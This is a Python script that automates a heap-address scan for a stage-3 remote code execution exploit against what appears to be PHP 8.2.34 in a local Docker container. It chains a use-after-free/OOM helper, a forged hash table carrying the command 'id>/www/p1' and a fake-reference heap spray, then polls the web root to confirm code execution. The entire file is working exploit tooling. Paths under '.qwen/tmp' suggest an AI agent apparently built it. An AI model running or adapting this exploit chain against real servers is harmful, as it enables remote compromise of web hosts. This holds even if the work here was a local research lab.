#!/usr/bin/env python3
"""Scan S (ht-addr) candidates on 8.2.34 for the local-assisted 9bie stage-3.
For each S: restart worker, A2 (cheap-oom dangling), build ht@S, B2 (fake-ref spray),
check /www/p1 for RCE. S = HEAPBASE + off.
"""
import os
import subprocess, time, sys, urllib.request

PORT = "18111"
HEAPBASE = 0x7a7507800000
ZIF = 0x7a7509b338a0
CMD = "id>/www/p1"
GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
PY = sys.executable

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)

def check_rce():
    try:
        d = urllib.request.urlopen("http://127.0.0.1:%s/p1" % PORT, timeout=8).read()
        return b"uid=" in d
    except Exception:
        return False

offs = [0xF6398, 0xE0000, 0xF0000, 0xFC000, 0x104000, 0xD8000, 0x110000, 0xC0000]
for off in offs:
    S = HEAPBASE + off
    sh(f"docker restart p2s8234 >nul 2>&1"); time.sleep(1.5)
    sh(f'"{PY}" {GH}\\gh_pure_cheap_oom_a.py --port {PORT} --parts 880 --depth 64 --fillers 115')
    time.sleep(0.4)
    ht = f"ht_scan_{off:x}.bin"
    sh(f'"{PY}" {GH}\\gh_pure_mk_ht.py {hex(S)} {hex(ZIF)} "{CMD}" "{GH}\\{ht}"')
    sh(f'"{PY}" {GH}\\gh_pure_fake_ref_b.py --port {PORT} --vl 384 --n1 500 --n2 495 --rc 1 --ht-addr {hex(S)} --ht-file "{GH}\\{ht}"')
    time.sleep(0.8)
    hit = check_rce()
    print(f"  off={off:#x} S={S:#x} -> {'*** RCE HIT ***' if hit else 'no rce'}", flush=True)
    if hit:
        break
print("scan done")
